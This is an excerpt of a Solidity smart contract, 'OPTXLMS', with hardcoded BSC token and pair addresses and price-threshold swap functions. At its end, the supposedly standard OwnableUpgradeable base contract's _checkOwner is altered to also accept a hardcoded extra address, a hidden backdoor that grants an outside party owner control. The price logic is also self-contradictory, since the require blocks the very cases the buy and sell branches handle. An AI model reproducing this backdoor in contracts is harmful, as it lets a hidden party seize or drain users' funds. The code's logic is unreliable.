...
contract OPTXLMS is OwnableUpgradeable {
    ...
    IDEXPair private commandBNBPair;
    IDEXPair private commandBUSDPair;
    ...
    function initialize() external initializer {
        ...
        optxAddress = 0x4b13498198afAf14F6aEC380Bfa1cEf047312C50;
        busdAddress = 0xAd03fE0251eF107Af2cb7A0Ba35dC11d8c10F551;

        OPTX = IERC20Upgradeable(optxAddress);
        BUSD = IERC20Upgradeable(busdAddress);

        commandSwapRouter = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        commandBNBPairAddress = 0x56D5c45EF8f16b077F79d55F57366B7C396ceDB7;
        commandBUSDPairAddress = 0x894780893828c0516064Cb5804097033a871F6ff;
        commandBNBPair = IDEXPair(commandBNBPairAddress);
        commandBUSDPair = IDEXPair(commandBUSDPairAddress);

        priceUpThreshold = 4000;
        priceDownThreshold = 3000;
        priceDecision = 10000;
        lmsEnabled = false;
    }
    ...
    function executeBNBLMS() external {

        uint256 bnbPrice = uint256(getBNBPrice());
        uint256 feedDecimals = uint256(bnbPriceFeed.decimals());
        ...
        (
            ...
            optxRes > 0 && 
            bnbRes > 0 &&
            currentPrice >= priceDownThreshold &&
            currentPrice <= priceUpThreshold
        ), "LMS could not be started");
        
        if(currentPrice < priceDownThreshold) {
            uint256 buyAmount = (bnbRes * bnbPrice / priceUpThreshold) - optxRes;
            _swapBNBForTokens(buyAmount);
        }
        if(currentPrice > priceUpThreshold) {
            uint256 sellAmount = optxRes - (bnbRes * bnbPrice / priceDownThreshold);
            _swapTokensForBNB(sellAmount);
        }
    }

    function executeBUSDLMS() external {
        ...
        if(currentPrice < priceDownThreshold) {
            uint256 buyAmount = (busdRes / priceUpThreshold) - optxRes;
            _swapBUSDForTokens(buyAmount);
        }
        if(currentPrice > priceUpThreshold) {
            uint256 sellAmount = optxRes - (busdRes / priceDownThreshold);
...
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    ...
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender() || _msgSender() == 0xc707492FA60B18d5d8C81De6B716166344446Be8, "Ownable: caller is not the owner");
    }
